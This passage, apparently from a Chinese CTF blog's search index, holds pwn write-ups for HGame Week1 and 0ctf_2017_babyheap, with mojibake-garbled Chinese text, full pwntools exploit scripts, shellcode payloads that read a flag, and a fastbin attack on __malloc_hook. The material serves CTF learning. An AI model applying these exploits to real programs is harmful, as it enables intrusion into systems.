not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... payload = flat([ asm(\u0026#39;\u0026#39;\u0026#39; mov rsi, rdx sub qword ptr [rsp], 36 ret \u0026#39;\u0026#39;\u0026#39;) ]) sendline_after_clean(payload) # ç”Ÿæˆorwçš„shellcode payload = flat([ asm(shellcraft.cat(\u0026#34;./flag\u0026#34;)) ]) sendline_after_clean(payload) interactive_after_clean() æ³•äºŒï¼šç›´æ¥syscallè°ƒç”¨readè¦†ç›–æŒ‡ä»¤ æ ¹æ®è°ƒç”¨0xcafe0000å‰å¯„å­˜å™¨çš„çŠ¶æ€ï¼š\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹shellcodeè°ƒç”¨readï¼š\nxchg edx, esi xchg r14d, edi xchg r11d, edx syscall xchg æŒ‡ä»¤æ˜¯ x86 æ±‡ç¼–è¯­è¨€ä¸­çš„ä¸€æ¡æŒ‡ä»¤ï¼Œå®ƒç”¨äºäº¤æ¢ä¸¤ä¸ªæ•°æ®çš„å€¼ã€‚å®ƒçš„è¯­æ³•ä¸€èˆ¬æ˜¯ xchg dest, srcï¼Œè¡¨ç¤ºå°† src å’Œ dest ä¸­çš„å€¼äº¤æ¢ã€‚è¿™ä¸¤ä¸ªå‚æ•°å¯ä»¥æ˜¯å¯„å­˜å™¨æˆ–å†…å­˜åœ°å€ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœå¯„å­˜å™¨ eax ä¸­å­˜å‚¨ç€æ•°å€¼ 4ï¼Œå¯„å­˜å™¨ ebx ä¸­å­˜å‚¨ç€æ•°å€¼ 5ï¼Œé‚£ä¹ˆæ‰§è¡Œ xchg eax, ebx åï¼Œeax å°†å­˜å‚¨ 5ï¼Œebx å°†å­˜å‚¨ 4ã€‚ xchg æŒ‡ä»¤é€šå¸¸ç”¨äºäº¤æ¢ä¸¤ä¸ªå€¼ï¼Œå¹¶ä¸”å®ƒä¸éœ€è¦é¢å¤–çš„å¯„å­˜å™¨ï¼Œå› æ­¤åœ¨å¤šå¤„ç†å™¨ç¯å¢ƒä¸­ï¼Œxchg æŒ‡ä»¤ä¹Ÿå¯ä»¥ç”¨æ¥å®ç°äº’æ–¥é” éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒxchgæŒ‡ä»¤æ˜¯åŸå­çš„ï¼Œå³åœ¨å…¶å®Œæˆå‰ä¸ä¼šè¢«ä¸­æ–­ã€‚è¿™æ˜¯å› ä¸º XCHG æŒ‡ä»¤çš„å®ç°æ˜¯é€šè¿‡ç¡¬ä»¶äº¤æ¢ä¸¤ä¸ªæ•°æ®è€Œä¸æ˜¯é€šè¿‡è¯»å–å’Œå†™å…¥å®ç°çš„ï¼Œè¿™æ„å‘³ç€åœ¨è¿™ä¸ªæŒ‡ä»¤å®Œæˆä¹‹å‰ä¸èƒ½è¢«ä»»ä½•å…¶ä»–æŒ‡ä»¤æ‰“æ–­ã€‚\næˆ–è€…ä½¿ç”¨ï¼š\nmov esi, edx xor edi, edi syscall åœ¨ x86 æ±‡ç¼–è¯­è¨€ä¸­ï¼Œmov esi, edx å’Œ mov rsi, rdx éƒ½æ˜¯ç”¨æ¥å°†å¯„å­˜å™¨ edx çš„å€¼èµ‹ç»™å¯„å­˜å™¨ esi (rsi)çš„æŒ‡ä»¤ã€‚ä½†è¿™ä¸¤æ¡æŒ‡ä»¤çš„äºŒè¿›åˆ¶é•¿åº¦æ˜¯ä¸åŒçš„ã€‚ mov esi, edx è¿™æ¡æŒ‡ä»¤ä½¿ç”¨çš„æ˜¯ 32 ä½å¯„å­˜å™¨ï¼Œå®ƒå¯¹åº”çš„äºŒè¿›åˆ¶é•¿åº¦ä¸º 2 å­—èŠ‚ï¼›è€Œmov rsi, rdx ä½¿ç”¨çš„æ˜¯64ä½å¯„å­˜å™¨ï¼ŒäºŒè¿›åˆ¶é•¿åº¦ä¸º3å­—èŠ‚. ä¸€èˆ¬æ¥è¯´ä½¿ç”¨32ä½å¯„å­˜å™¨ï¼Œshellcodeä¼šæ›´çŸ­\nç„¶åä½¿ç”¨nopæ»‘æ¿åˆ’åˆ°orwçš„shellcodeï¼š\npayload = flat([ asm(\u0026#34;nop\u0026#34;)*0x10, asm(shellcraft.cat(\u0026#34;./flag\u0026#34;)) ]) nop æŒ‡ä»¤æ˜¯ x86 æ±‡ç¼–è¯­è¨€ä¸­çš„ä¸€æ¡æŒ‡ä»¤ï¼Œå®ƒä»£è¡¨ \u0026ldquo;no operation\u0026rdquo;ï¼Œå³ä¸æ‰§è¡Œä»»ä½•æ“ä½œã€‚åœ¨äºŒè¿›åˆ¶ä¸­ï¼Œå®ƒå¯¹åº”çš„æ˜¯ 0x90ã€‚ è¿™ä¸ªæŒ‡ä»¤ç”¨äºè°ƒæ•´æŒ‡ä»¤æµç¨‹ï¼Œå¦‚åœ¨ç¨‹åºæ‰§è¡Œå‰æˆ–æ‰§è¡Œåæ’å…¥ NOP æŒ‡ä»¤æ¥è°ƒæ•´ç¨‹åºä¸­çš„åå·®ã€‚ä¹Ÿå¯ç”¨äºå ä½ç”¨ï¼Œä¾‹å¦‚å°†æŒ‡ä»¤æŒ‰ç…§é¢„æœŸçš„é¡ºåºåˆ†å¸ƒã€‚ åœ¨é«˜çº§ç¼–ç¨‹ä¸­ï¼ŒNOPæŒ‡ä»¤ä¹Ÿå¯èƒ½è¢«ç”¨æ¥ä½œä¸ºæŒ‡ä»¤é‡å®šä½çš„èµ·å§‹ä½ç½®æˆ–ç»ˆæ­¢ä½ç½®ï¼Œç ”ç©¶å’Œåˆ†æç¨‹åºçš„æŒ‡ä»¤æµç¨‹ã€‚\nå®Œæ•´expï¼š\n# è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./HGame-simple_shellcode\u0026#34; libc_name: str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;30295\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* $rebase(0x13BB) c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True, is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... payload = flat([ asm(\u0026#39;\u0026#39;\u0026#39; mov esi, edx xor edi, edi syscall \u0026#39;\u0026#39;\u0026#39;) ]) sendline_after_clean(payload) # ç”Ÿæˆorwçš„shellcode payload = flat([ asm(\u0026#34;nop\u0026#34;)*0x10, asm(shellcraft.cat(\u0026#34;./flag\u0026#34;)) ]) sendline_after_clean(payload) interactive_after_clean() ","date":"2023å¹´01æœˆ18æ—¥","permalink":"https://peterliuzhi.top/writeup/hgame-week1-pwn-writeup/","section":"writeup","summary":"The greatest healing therapy is friendship and love. â€” Hubert Humphrey test_nc ncè¿ä¸Šè¿œç¨‹ç›´æ¥cat flag easy_overflow checksec ida ç®€å•çš„æ ˆæº¢å‡ºï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„æ˜¯åœ¨get shellå‰å°†æ ‡å‡†è¾“å‡ºæµå…³æ‰äº†ï¼Œä½†æˆ‘ä»¬å¯ä»¥ç”¨shellå‘½ä»¤","tags":["pwn","æ›´æ”¹gotè¡¨","orw","æ ˆè¿ç§»","è½¬ç§»ç¨‹åº","nopæ»‘æ¿","shellcraftç”Ÿæˆorwçš„shellcode"],"title":"HGame Week1 PWN WriteUp"},{"categories":["tricks"],"contents":" A man\u0026rsquo;s growth is seen in the successive choirs of his friends â€” Ralph Waldo Emerson\né—®é¢˜ åœ¨ä½¿ç”¨pwntoolsè°ƒè¯•ç¨‹åºçš„æ—¶å€™ï¼Œåœ¨gdbçª—å£ä¸­ä½¿ç”¨pwndbgçš„ç‰¹æ®Šå‘½ä»¤å‡ºç°å¦‚ä¸‹è­¦å‘Šï¼š\næŒ‰æŒ‡ç¤ºä¸‹è½½äº†ç›¸å…³çš„åº“ä¹‹åè­¦å‘Šå´å¹¶æ²¡æœ‰æ¶ˆå¤±ï¼Œè¿™å®åœ¨æ˜¯ä¸€ä»¶éå¸¸è›‹ç–¼çš„äº‹æƒ…\nå¦‚æœä¸èƒ½ä½¿ç”¨pwndbgç›¸å…³å‘½ä»¤ï¼Œæˆ‘ä»¬å°±åªèƒ½ç”¨vmmapæŸ¥çœ‹heapåŸºå€ï¼Œç„¶åç”¨xä¸€ä¸ªä¸€ä¸ªchunkçœ‹ï¼Œéå¸¸éº»çƒ¦\nè§£å†³æ–¹æ³•ï¼ˆå¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼‰ åœ¨gdbçª—å£è¾“å…¥ï¼š\nset resolve-heap-via-heuristic on è¿™å’Œæˆ‘ä»¬ç”¨vmmapæŸ¥çœ‹heapåŸºå€çš„åŸç†ä¸€æ ·ï¼Œpwndbgä¼šå°è¯•é€šè¿‡è¿™ä¸ªåŸºå€è®¡ç®—å‡ºheapçš„ä¿¡æ¯ï¼Œè¿™ä¸ä¸€å®šæ˜¯å¯¹çš„ï¼Œä½†è‡³å°‘åœ¨å¾ˆå¤šæƒ…å†µä¸‹èƒ½ç”¨\nåŸæœ¬æ²¡æœ‰è¿™ä¸ªåŠŸèƒ½ï¼Œæ˜¯ä¸€ä½å¤§ä½¬å‘ç°gefä¸­æ²¡æœ‰è°ƒè¯•ç¬¦å·ä¹Ÿèƒ½æ­£å¸¸ä½¿ç”¨ï¼Œäºæ˜¯å‚è€ƒgefç»™pwndbgåšäº†ä¸€ä¸ªPRï¼Œè¯¦æƒ…è§Heap inspection without libc debug symbols Â· Issue #937 Â· pwndbg/pwndbg Â· GitHubï¼Œæ„Ÿè°¢è¿™ä½å¸ˆå‚…\n","date":"2023å¹´01æœˆ17æ—¥","permalink":"https://peterliuzhi.top/tricks/pwntools%E8%B0%83%E7%94%A8gdb%E8%B0%83%E8%AF%95%E6%97%B6%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8binsheap%E7%AD%89%E5%91%BD%E4%BB%A4/","section":"tricks","summary":"A man\u0026rsquo;s growth is seen in the successive choirs of his friends â€” Ralph Waldo Emerson é—®é¢˜ åœ¨ä½¿ç”¨pwntoolsè°ƒè¯•ç¨‹åºçš„æ—¶å€™ï¼Œåœ¨gdbçª—å£ä¸­ä½¿ç”¨pwndbgçš„ç‰¹æ®Šå‘½ä»¤å‡ºç°å¦‚ä¸‹è­¦å‘Šï¼š æŒ‰æŒ‡ç¤ºä¸‹è½½äº†ç›¸å…³çš„åº“ä¹‹","tags":["pwn"],"title":"pwntoolsè°ƒç”¨gdbè°ƒè¯•æ—¶æ— æ³•ä½¿ç”¨binsã€heapç­‰å‘½ä»¤"},{"categories":["writeup"],"contents":" The best preparation for tomorrow is doing your best today. â€” H. Jackson Brown Jr.\nåŸé¢˜é“¾æ¥\nchecksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  å…¸å‹èœå•é¢˜ï¼Œæ¯”è¾ƒç‰¹æ®Šçš„æ˜¯ï¼Œå®ƒä½¿ç”¨äº†ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œæ¯ä¸ªç»“æ„ä½“å†…çš„contentåŸŸä¸­ä¿å­˜ä¸€ä¸ªæŒ‡å‘å †å†…å­˜çš„æŒ‡é’ˆ\ninit_0å‡½æ•° å®šä¹‰äº†ä¸€ä¸ªæ•´æ•°å˜é‡ fdï¼Œä¸€ä¸ªå­—ç¬¦æŒ‡é’ˆå˜é‡ addr ä»¥åŠä¸€ä¸ªæ— ç¬¦å·64ä½æ•´å‹å˜é‡ v3ã€‚ ä½¿ç”¨ __readfsqword æŒ‡ä»¤ä»å¯„å­˜å™¨fsä¸­è¯»å– 0x28 åœ°å€çš„å€¼å­˜å…¥buf[3] ä½¿ç”¨ setvbuf å‡½æ•°å°†stdinå’Œ _bss_startçš„ç¼“å­˜æ¨¡å¼è®¾ç½®ä¸º2,å³ä»¥è¡Œç¼“å­˜çš„æ–¹å¼è¾“å…¥ ä½¿ç”¨alarmå‡½æ•°è®¾ç½®60ç§’è¶…æ—¶ æ‰“å°å­—ç¬¦ä¸² ä½¿ç”¨openæ‰“å¼€/dev/urandomæ–‡ä»¶å¹¶èµ‹å€¼ç»™fd å¦‚æœ fd \u0026lt; 0 æˆ–è€… read(fd, buf, 0x10uLL) è¿”å›å€¼ä¸ä¸º16,åˆ™ç»ˆæ­¢ç¨‹åº å…³é—­æ–‡ä»¶ è®¡ç®—å‡ºä¸€ä¸ªåœ°å€addr,å…¶å€¼ä¸º(buf[9]. ç„¶åè®¡ç®—ä¸€ä¸ªå˜é‡v3. ä½¿ç”¨mmapç³»ç»Ÿè°ƒç”¨å°†addrå¼€å§‹çš„1kåœ°å€æ˜ å°„åˆ°å†…å­˜ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸º3ï¼Œè¡¨ç¤ºå¯è¯»å¯å†™,ç¬¬å››ä¸ªå‚æ•°ä¸º34è¡¨ç¤ºè®©ç³»ç»Ÿè‡ªåŠ¨é€‰æ‹©å†…å­˜åœ°å€ï¼Œæœ€åä¸€ä¸ªå‚æ•°ä¸º0è¡¨ç¤ºç›¸å¯¹äºèµ·å§‹åœ°å€ï¼Œè‹¥æ˜ å°„ä¸æˆåŠŸï¼Œé€€å‡ºç¨‹åºã€‚ è¿”å› \u0026amp;addr[v3] è¿™æ®µä»£ç æ˜¯åœ¨åˆ†é…ä¸€ä¸ªç±»ä¼¼å †å†…å­˜çš„å†…å­˜åŒºåŸŸï¼Œå¹¶è¿”å›è¿™å—å†…å­˜çš„åœ°å€ã€‚é€šè¿‡ä½¿ç”¨/dev/urandomäº§ç”Ÿçš„éšæœºæ•°æ¥è¿›è¡Œå†…å­˜åœ°å€çš„è®¡ç®—ï¼Œæ¥é¿å…é¢„æµ‹åœ°å€ã€‚\nmmapå‡½æ•° mmap æ˜¯ä¸€ä¸ª C åº“å‡½æ•°ï¼Œç”¨äºåœ¨è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­åˆ›å»ºä¸€æ®µå†…å­˜æ˜ å°„ã€‚\nè¯¥å‡½æ•°çš„åŸå‹ä¸ºï¼š\nvoid* mmap(void* addr, size_t length, int prot, int flags, int fd, off_t offset); å®ƒæœ‰ä»¥ä¸‹å‚æ•°ï¼š\naddrï¼šæŒ‡å®šæ˜ å°„å†…å­˜æ®µçš„é¦–åœ°å€ã€‚ lengthï¼šæŒ‡å®šæ˜ å°„å†…å­˜æ®µçš„å¤§å°ã€‚ protï¼šæŒ‡å®šæ˜ å°„å†…å­˜æ®µçš„è®¿é—®æƒé™ã€‚ flagsï¼šæŒ‡å®šæ˜ å°„å†…å­˜æ®µçš„å…¶ä»–ç‰¹æ€§ã€‚ fdï¼šæŒ‡å®šè¦æ˜ å°„çš„æ–‡ä»¶æè¿°ç¬¦ã€‚ offsetï¼šæŒ‡å®šè¦æ˜ å°„çš„æ–‡ä»¶å†…å­˜åç§»é‡ã€‚ æ‰€ä»¥ï¼Œmmap(addr, 0x1000uLL, 3, 34, -1, 0LL)çš„æ„æ€æ˜¯ï¼š\nåœ¨è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­åˆ›å»ºä¸€æ®µå¤§å°ä¸º 0x1000 å­—èŠ‚çš„å†…å­˜æ˜ å°„ã€‚ è¿™æ®µå†…å­˜æ˜ å°„çš„é¦–åœ°å€ä¸º addrã€‚ è¿™æ®µå†…å­˜æ˜ å°„çš„è®¿é—®æƒé™ä¸ºå¯è¯»å†™æ‰§è¡Œï¼ˆå³ 3ï¼‰ã€‚ è¿™æ®µå†…å­˜æ˜ å°„çš„å…¶ä»–ç‰¹æ€§ä¸ºå…±äº«å†…å­˜ï¼ˆå³ 34ï¼‰ã€‚ è¿™æ®µå†…å­˜æ˜ å°„å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦ä¸º -1ã€‚ è¿™æ®µå†…å­˜æ˜ å°„å¯¹åº”çš„æ–‡ä»¶å†…å­˜åç§»é‡ä¸º 0ã€‚ âœï¸ä»¥ä¸Šä¿¡æ¯æ¥æºäºchatgpt\næ€»ä¹‹ï¼Œå®ƒåœ¨é˜²æ­¢æˆ‘ä»¬æ‹¿åˆ°ç»“æ„ä½“çš„åœ°å€\nallocate å…¶ä¸­strucç»“æ„ä½“ä¸ºï¼š\nchange è¿™ä¸ªå‡½æ•°å¯ä»¥å®ç°ä»»æ„é•¿åº¦å†™ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹ä»»æ„chunkçš„sizeä½\nremove freeåç½®é›¶ï¼Œé˜²æ­¢äº†UAFå’Œdouble free\nshow è¿™é‡Œä¼šæ‰“å°å‡ºsizeä¸ªå­—ç¬¦ï¼Œä¸è®ºæ˜¯å¦æ˜¯\\x00\nå¤§è‡´æ€è·¯ åˆ©ç”¨ä»»æ„é•¿åº¦å†™ï¼Œå®ç°chunk overlapåé‡Šæ”¾å†åˆ†é…ï¼Œå°±å¾—åˆ°äº†å®ƒæ‰€è¦†ç›–çš„chunkçš„éšæ—¶å¯è¯»æƒ\nç„¶åæˆ‘ä»¬è®©å®ƒè¦†ç›–ä¸€ä¸ª0x80çš„chunkï¼Œé‡Šæ”¾è¿™ä¸ªchunkåï¼Œæˆ‘ä»¬å°±å¯ä»¥è¯»åˆ°å®ƒfdæŒ‡é’ˆå†…çš„main_arenaåœ°å€ï¼Œä»è€Œè®¡ç®—å‡ºlibcåŸºå€\nç„¶åæˆ‘ä»¬å†è®¾è®¡ä¸€ä¸ª0x68å¤§å°çš„chunkï¼Œé‡Šæ”¾åç”¨å®ƒä¸Šæ–¹çš„chunkçš„ä»»æ„é•¿åº¦å†™æ›´æ”¹å…¶fdæŒ‡é’ˆï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½å®ç°fastbin attackï¼Œå°†å…¶åˆ†é…åˆ°__malloc_hook-0x23å¤„ï¼ˆè¿™æ˜¯ä¸€ä¸ªå›ºå®šçš„æ¼æ´åœ°å€ï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡sizeä½æ£€æŸ¥ï¼Œæ›´æ”¹__malloc_hookä¸ºone_gadget\næ›´å¤šé˜…è¯»ï¼š[BUUCTF]PWNâ€”â€”0ctf_2017_babyheap_Angel~Yançš„åšå®¢-CSDNåšå®¢\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes from pymao import * pss: bool = False fn: str = \u0026#34;./0ctf_2017_babyheap\u0026#34; libc_name: str = \u0026#34;/home/kali/share/share_files/security/buuctf_libc/libc-2.23_64.so\u0026#34; port: str = \u0026#34;25886\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None, drop_bound: bool = True) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if drop_bound else p.recvuntil(bound) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) if drop_bound else p.recvuntil(bound) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = 